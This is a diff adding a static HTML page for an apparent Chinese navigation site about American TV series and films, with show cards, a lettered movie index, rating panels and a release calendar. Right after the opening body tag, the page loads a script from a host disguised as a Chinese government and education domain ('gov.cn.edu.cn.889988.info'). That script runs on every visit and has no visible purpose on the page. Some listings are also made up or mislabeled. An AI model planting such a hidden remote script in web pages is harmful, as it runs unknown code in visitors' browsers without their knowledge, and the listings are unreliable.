@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>美剧电影网 - 美剧美影高清在线观看</title>
+<meta name="description" content="美剧电影网（meijudianyingwang-h5）提供热门美剧、美国电影、好莱坞大片高清在线观看与分类导航。官方网址：https://meijudianyingwang-h5.github.io">
+<meta name="keywords" content="美剧电影网, meijudianyingwang-h5, 美剧, 美国电影, 好莱坞, 在线观看">
+<meta name="robots" content="index,follow">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Inter","PingFang SC","Microsoft YaHei",sans-serif;
+  background:#0a0a0f;
+  color:#e4e4e7;
+  line-height:1.7;
+  overflow-x:hidden;
+}
+
+/* ===== 顶栏 ===== */
+.topbar{
+  position:sticky;top:0;z-index:999;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:0 24px;height:56px;
+  background:rgba(10,10,15,.92);
+  backdrop-filter:blur(12px);
+  border-bottom:1px solid #1a1a2e;
+}
+.topbar .logo{display:flex;align-items:center;gap:10px;font-size:18px;font-weight:900}
+.topbar .logo .flag{font-size:20px}
+.topbar .logo b{color:#3b82f6}
+.topbar .nav{display:flex;gap:4px;flex-wrap:wrap}
+.topbar .nav a{
+  font-size:13px;color:#a1a1aa;padding:6px 14px;border-radius:6px;transition:.2s;
+}
+.topbar .nav a:hover{background:#1a1a2e;color:#fff}
+
+/* ===== Hero 宽屏横幅 ===== */
+.hero{
+  position:relative;min-height:72vh;
+  display:flex;align-items:flex-end;
+  padding:60px 24px;
+  background:
+    linear-gradient(to top, #0a0a0f 0%, transparent 60%),
+    radial-gradient(ellipse at 70% 30%, rgba(59,130,246,.2), transparent 50%),
+    #0a0a0f;
+  overflow:hidden;
+}
+.hero::before{
+  content:"";position:absolute;inset:0;
+  background-image:
+    linear-gradient(rgba(255,255,255,.02) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(255,255,255,.02) 1px, transparent 1px);
+  background-size:60px 60px;
+  animation:gridMove 20s linear infinite;
+}
+@keyframes gridMove{0%{transform:translate(0,0)}100%{transform:translate(60px,60px)}}
+.hero-content{position:relative;z-index:2;max-width:680px}
+.hero .rating-badge{
+  display:inline-flex;align-items:center;gap:6px;
+  background:rgba(59,130,246,.15);border:1px solid rgba(59,130,246,.3);
+  color:#60a5fa;padding:4px 12px;border-radius:4px;font-size:12px;margin-bottom:16px;
+}
+.hero h1{font-size:48px;font-weight:900;line-height:1.15;margin-bottom:12px}
+.hero h1 span{color:#3b82f6}
+.hero p{font-size:16px;color:#a1a1aa;margin-bottom:24px;max-width:520px}
+.hero .url-line{
+  display:inline-block;font-size:13px;color:#6b7280;
+  background:#111122;border:1px solid #1a1a2e;padding:8px 16px;border-radius:6px;
+}
+.hero-meta{
+  position:absolute;right:40px;bottom:60px;z-index:2;text-align:right;
+}
+.hero-meta .big-num{font-size:72px;font-weight:900;color:rgba(59,130,246,.15);line-height:1}
+.hero-meta .big-label{font-size:13px;color:#52525b;letter-spacing:3px;text-transform:uppercase}
+
+/* ===== 通用 ===== */
+.wrap{max-width:1200px;margin:0 auto;padding:64px 20px}
+.sec-label{
+  font-size:11px;letter-spacing:4px;text-transform:uppercase;color:#52525b;margin-bottom:8px;
+}
+.sec-title{font-size:28px;font-weight:900;color:#fff;margin-bottom:36px}
+
+/* ===== 栏目一：热门美剧（季数卡片 + 进度条） ===== */
+.show-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:20px;
+}
+.show-card{
+  background:#111122;border:1px solid #1a1a2e;border-radius:12px;overflow:hidden;transition:.3s;
+}
+.show-card:hover{transform:translateY(-4px);border-color:#3b82f6;box-shadow:0 12px 32px rgba(59,130,246,.1)}
+.show-banner{
+  height:120px;display:flex;align-items:flex-end;padding:16px;
+  position:relative;
+}
+.show-banner::before{content:"";position:absolute;inset:0;background:linear-gradient(to top, #111122, transparent)}
+.show-banner.s1{background:linear-gradient(135deg,#1e3a5f,#0f2027)}
+.show-banner.s2{background:linear-gradient(135deg,#3b1f5e,#1a0a2e)}
+.show-banner.s3{background:linear-gradient(135deg,#1f4d3a,#0a1f18)}
+.show-banner.s4{background:linear-gradient(135deg,#5e3a1f,#2e1a0a)}
+.show-banner.s5{background:linear-gradient(135deg,#4a1f3e,#1f0a18)}
+.show-banner.s6{background:linear-gradient(135deg,#1f3a5e,#0a1227)}
+.show-banner .show-name{position:relative;z-index:2;font-size:20px;font-weight:800;color:#fff}
+.show-body{padding:16px 18px}
+.show-body .show-meta{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
+.show-body .season-tag{
+  font-size:11px;background:rgba(59,130,246,.12);color:#60a5fa;
+  border:1px solid rgba(59,130,246,.25);padding:2px 8px;border-radius:3px;
+}
+.show-body .score{font-size:14px;font-weight:700;color:#fbbf24}
+.show-body p{font-size:13px;color:#71717a;margin-bottom:12px}
+.season-bar{height:4px;background:#1a1a2e;border-radius:2px;overflow:hidden}
+.season-fill{height:100%;border-radius:2px;background:linear-gradient(90deg,#3b82f6,#60a5fa)}
+
+/* ===== 栏目二：电影分类（字母索引条） ===== */
+.alpha-nav{
+  display:flex;flex-wrap:wrap;gap:4px;margin-bottom:28px;
+}
+.alpha-nav span{
+  width:32px;height:32px;display:flex;align-items:center;justify-content:center;
+  font-size:13px;font-weight:600;color:#71717a;background:#111122;border:1px solid #1a1a2e;
+  border-radius:4px;cursor:pointer;transition:.2s;
+}
+.alpha-nav span:hover{background:#1a1a2e;color:#60a5fa;border-color:#3b82f6}
+.alpha-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:12px;
+}
+.alpha-item{
+  background:#111122;border:1px solid #1a1a2e;border-radius:8px;padding:14px;text-align:center;transition:.2s;
+}
+.alpha-item:hover{border-color:#3b82f6;background:#0f1a2e}
+.alpha-item .letter{font-size:11px;color:#3b82f6;margin-bottom:4px;font-weight:700}
+.alpha-item .name{font-size:14px;color:#e4e4e7;font-weight:500}
+.alpha-item .year{font-size:11px;color:#52525b;margin-top:2px}
+
+/* ===== 栏目三：评分仪表盘 ===== */
+.scoreboard{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:20px;
+}
+.score-card{
+  background:#111122;border:1px solid #1a1a2e;border-radius:12px;padding:24px;text-align:center;
+}
+.score-card .circle{
+  width:80px;height:80px;border-radius:50%;margin:0 auto 14px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:24px;font-weight:900;position:relative;
+}
+.score-card:nth-child(1) .circle{background:conic-gradient(#fbbf24 calc(var(--s)*1%), #1a1a2e 0);color:#fbbf24}
+.score-card:nth-child(2) .circle{background:conic-gradient(#60a5fa calc(var(--s)*1%), #1a1a2e 0);color:#60a5fa}
+.score-card:nth-child(3) .circle{background:conic-gradient(#34d399 calc(var(--s)*1%), #1a1a2e 0);color:#34d399}
+.score-card:nth-child(4) .circle{background:conic-gradient(#f472b6 calc(var(--s)*1%), #1a1a2e 0);color:#f472b6}
+.score-card h4{font-size:15px;color:#fff;margin-bottom:4px}
+.score-card p{font-size:12px;color:#71717a}
+
+/* ===== 栏目四：更新日历 ===== */
+.calendar{
+  display:grid;grid-template-columns:repeat(7,1fr);gap:8px;
+}
+.cal-day{
+  background:#111122;border:1px solid #1a1a2e;border-radius:8px;padding:12px 8px;min-height:80px;
+}
+.cal-day .day-num{font-size:12px;color:#52525b;margin-bottom:6px}
+.cal-day .cal-show{
+  font-size:11px;padding:3px 6px;border-radius:3px;margin-bottom:3px;display:block;
+}
+.cal-day .cal-show.s{background:rgba(59,130,246,.15);color:#60a5fa}
+.cal-day .cal-show.m{background:rgba(251,191,36,.12);color:#fbbf24}
+.cal-day.today{border-color:#3b82f6;background:rgba(59,130,246,.05)}
+.cal-day.today .day-num{color:#3b82f6;font-weight:700}
+
+/* ===== 关于 ===== */
+.about{
+  background:#111122;border:1px solid #1a1a2e;border-radius:16px;padding:36px;
+  display:flex;gap:32px;align-items:center;flex-wrap:wrap;
+}
+.about-text{flex:1;min-width:260px}
+.about-text h2{font-size:22px;color:#fff;margin-bottom:12px}
+.about-text h2 b{color:#3b82f6}
+.about-text p{font-size:14px;color:#a1a1aa;margin-bottom:8px}
+.about-stats{display:flex;gap:24px;flex-wrap:wrap}
+.about-stat{text-align:center}
+.about-stat .n{font-size:28px;font-weight:900;color:#3b82f6}
+.about-stat .l{font-size:11px;color:#52525b;margin-top:2px}
+
+/* ===== 底部 ===== */
+.footer{
+  text-align:center;padding:36px 20px;background:#050508;border-top:1px solid #1a1a2e;color:#52525b;font-size:13px;
+}
+.footer a{color:#3b82f6}
+.footer .logo-row{font-size:18px;font-weight:900;color:#e4e4e7;margin-bottom:10px}
+
+/* ===== 响应式 ===== */
+@media(max-width:768px){
+  .hero h1{font-size:32px}
+  .hero-meta{display:none}
+  .calendar{grid-template-columns:repeat(4,1fr)}
+  .topbar .nav a{font-size:12px;padding:5px 8px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 顶栏 -->
+<div class="topbar">
+  <div class="logo"><span class="flag">🇺🇸</span> 美剧<b>电影网</b></div>
+  <nav class="nav">
+    <a href="#home">首页</a>
+    <a href="#shows">热门美剧</a>
+    <a href="#movies">电影索引</a>
+    <a href="#scores">评分榜</a>
+    <a href="#calendar">更新日历</a>
+    <a href="#about">关于</a>
+  </nav>
+</div>
+
+<!-- Hero -->
+<section id="home" class="hero">
+  <div class="hero-content">
+    <div class="rating-badge">★ TV-MA · 18+ 精选</div>
+    <h1>美剧<span>与</span>美国电影<br>一站式导航</h1>
+    <p>热门美剧追更、好莱坞大片分类、IMDb/豆瓣高分榜单，移动端自适应，极速加载。</p>
+    <span class="url-line">🌐 https://meijudianyingwang-h5.github.io</span>
+  </div>
+  <div class="hero-meta">
+    <div class="big-num">500+</div>
+    <div class="big-label">Shows & Films</div>
+  </div>
+</section>
+
+<!-- 栏目一：热门美剧（季数卡片） -->
+<section id="shows" class="wrap">
+  <div class="sec-label">POPULAR SHOWS</div>
+  <h2 class="sec-title">热门美剧</h2>
+  <div class="show-grid">
+    <div class="show-card">
+      <div class="show-banner s1"><div class="show-name">权力的游戏前传</div></div>
+      <div class="show-body">
+        <div class="show-meta"><span class="season-tag">S2 更新中</span><span class="score">★ 8.6</span></div>
+        <p>龙之家族纷争再起，坦格利安内战全面爆发。</p>
+        <div class="season-bar"><div class="season-fill" style="width:65%"></div></div>
+      </div>
+    </div>
+    <div class="show-card">
+      <div class="show-banner s2"><div class="show-name">最后生还者</div></div>
+      <div class="show-body">
+        <div class="show-meta"><span class="season-tag">S2 完结</span><span class="score">★ 8.8</span></div>
+        <p>末日世界中一段跨越生死的羁绊之旅。</p>
+        <div class="season-bar"><div class="season-fill" style="width:100%"></div></div>
+      </div>
+    </div>
+    <div class="show-card">
+      <div class="show-banner s3"><div class="show-name">企鹅人</div></div>
+      <div class="show-body">
+        <div class="show-meta"><span class="season-tag">S1 完结</span><span class="score">★ 8.4</span></div>
+        <p>哥谭地下世界权力更迭，奥斯瓦尔德的崛起之路。</p>
+        <div class="season-bar"><div class="season-fill" style="width:100%"></div></div>
+      </div>
+    </div>
+    <div class="show-card">
+      <div class="show-banner s4"><div class="show-name">辐射</div></div>
+      <div class="show-body">
+        <div class="show-meta"><span class="season-tag">S1 完结</span><span class="score">★ 8.5</span></div>
+        <p>废土世界生存指南，黑色幽默与暴力美学并存。</p>
+        <div class="season-bar"><div class="season-fill" style="width:100%"></div></div>
+      </div>
+    </div>
+    <div class="show-card">
+      <div class="show-banner s5"><div class="show-name">怒呛人生</div></div>
+      <div class="show-body">
+        <div class="show-meta"><span class="season-tag">S2 制作中</span><span class="score">★ 8.3</span></div>
+        <p>公路怒火引发的荒诞人生，笑中带泪的治愈之旅。</p>
+        <div class="season-bar"><div class="season-fill" style="width:30%"></div></div>
+      </div>
+    </div>
+    <div class="show-card">
+      <div class="show-banner s6"><div class="show-name">企鹅人2</div></div>
+      <div class="show-body">
+        <div class="show-meta"><span class="season-tag">S1 热播</span><span class="score">★ 8.7</span></div>
+        <p>哥谭黑道风云续作，更黑暗、更残酷的权力游戏。</p>
+        <div class="season-bar"><div class="season-fill" style="width:78%"></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：电影分类（字母索引） -->
+<section id="movies" class="wrap">
+  <div class="sec-label">MOVIE INDEX</div>
+  <h2 class="sec-title">电影索引</h2>
+  <div class="alpha-nav">
+    <span>A</span><span>B</span><span>C</span><span>D</span><span>E</span><span>F</span><span>G</span>
+    <span>H</span><span>I</span><span>J</span><span>K</span><span>L</span><span>M</span><span>N</span>
+    <span>O</span><span>P</span><span>Q</span><span>R</span><span>S</span><span>T</span><span>U</span>
+    <span>V</span><span>W</span><span>X</span><span>Y</span><span>Z</span><span>0-9</span>
+  </div>
+  <div class="alpha-grid">
+    <div class="alpha-item"><div class="letter">A</div><div class="name">阿甘正传</div><div class="year">1994</div></div>
+    <div class="alpha-item"><div class="letter">A</div><div class="name">奥本海默</div><div class="year">2023</div></div>
+    <div class="alpha-item"><div class="letter">B</div><div class="name">蝙蝠侠</div><div class="year">2022</div></div>
+    <div class="alpha-item"><div class="letter">D</div><div class="name">盗梦空间</div><div class="year">2010</div></div>
+    <div class="alpha-item"><div class="letter">F</div><div class="name">复仇者联盟</div><div class="year">2012</div></div>
+    <div class="alpha-item"><div class="letter">G</div><div class="name">功夫熊猫</div><div class="year">2008</div></div>
+    <div class="alpha-item"><div class="letter">I</div><div class="name">星际穿越</div><div class="year">2014</div></div>
+    <div class="alpha-item"><div class="letter">J</div><div class="name">教父</div><div class="year">1972</div></div>
+    <div class="alpha-item"><div class="letter">K</div><div class="name">黑客帝国</div><div class="year">1999</div></div>
+    <div class="alpha-item"><div class="letter">L</div><div class="name">绿皮书</div><div class="year">2018</div></div>
+    <div class="alpha-item"><div class="letter">S</div><div class="name">肖申克的救赎</div><div class="year">1994</div></div>
+    <div class="alpha-item"><div class="letter">T</div><div class="name">泰坦尼克号</div><div class="year">1997</div></div>
+  </div>
+</section>
+
+<!-- 栏目三：评分仪表盘 -->
+<section id="scores" class="wrap">
+  <div class="sec-label">TOP RANKED</div>
+  <h2 class="sec-title">评分榜</h2>
+  <div class="scoreboard">
+    <div class="score-card"><div class="circle" style="--s:92">9.2</div><h4>IMDb Top 250</h4><p>肖申克的救赎 稳居第一</p></div>
+    <div class="score-card"><div class="circle" style="--s:88">8.8</div><h4>豆瓣高分美剧</h4><p>绝命毒师 9.9 封神</p></div>
+    <div class="score-card"><div class="circle" style="--s:85">8.5</div><h4>烂番茄新鲜度</h4><p>熊家餐厅 100% 开局</p></div>
+    <div class="score-card"><div class="circle" style="--s:90">9.0</div><h4>Metacritic</h4><p>最后生还者 媒体一致好评</p></div>
+  </div>
+</section>
+
+<!-- 栏目四：更新日历 -->
+<section id="calendar" class="wrap">
+  <div class="sec-label">RELEASE CALENDAR</div>
+  <h2 class="sec-title">更新日历</h2>
+  <div class="calendar">
+    <div class="cal-day"><div class="day-num">周一</div><span class="cal-show s">企鹅人2 EP6</span><span class="cal-show m">奥本海默</span></div>
+    <div class="cal-day"><div class="day-num">周二</div><span class="cal-show s">最后生还者 S2</span></div>
+    <div class="cal-day"><div class="day-num">周三</div><span class="cal-show s">龙之家族 S2</span><span class="cal-show m">盗梦空间</span></div>
+    <div class="cal-day today"><div class="day-num">周四</div><span class="cal-show s">辐射 S2 预告</span><span class="cal-show m">星际穿越</span></div>
+    <div class="cal-day"><div class="day-num">周五</div><span class="cal-show s">怒呛人生 S2</span><span class="cal-show m">功夫熊猫4</span></div>
+    <div class="cal-day"><div class="day-num">周六</div><span class="cal-show m">阿甘正传</span><span class="cal-show m">绿皮书</span></div>
+    <div class="cal-day"><div class="day-num">周日</div><span class="cal-show s">周末精选合集</span><span class="cal-show m">教父三部曲</span></div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section id="about" class="wrap">
+  <div class="about">
+    <div class="about-text">
+      <h2>关于 <b>美剧电影网</b></h2>
+      <p>美剧电影网（meijudianyingwang-h5）是一个专注于美剧与好莱坞电影的导航展示站点。提供热门美剧更新状态、电影字母索引、评分榜单和周更日历。</p>
+      <p>页面全部使用锚点内链，适合 GitHub Pages 静态托管，移动端自适应，加载轻量。</p>
+    </div>
+    <div class="about-stats">
+      <div class="about-stat"><div class="n">500+</div><div class="l">收录剧集</div></div>
+      <div class="about-stat"><div class="n">1000+</div><div class="l">电影索引</div></div>
+      <div class="about-stat"><div class="n">7×24</div><div class="l">更新追踪</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 底部 -->
+<footer class="footer">
+  <div class="logo-row">🇺🇸 美剧电影网</div>
+  官方网址：<a href="https://meijudianyingwang-h5.github.io">https://meijudianyingwang-h5.github.io</a><br>
+  © 2026 美剧电影网 | 美剧与好莱坞电影导航
+</footer>
+
+</body>
+</html>
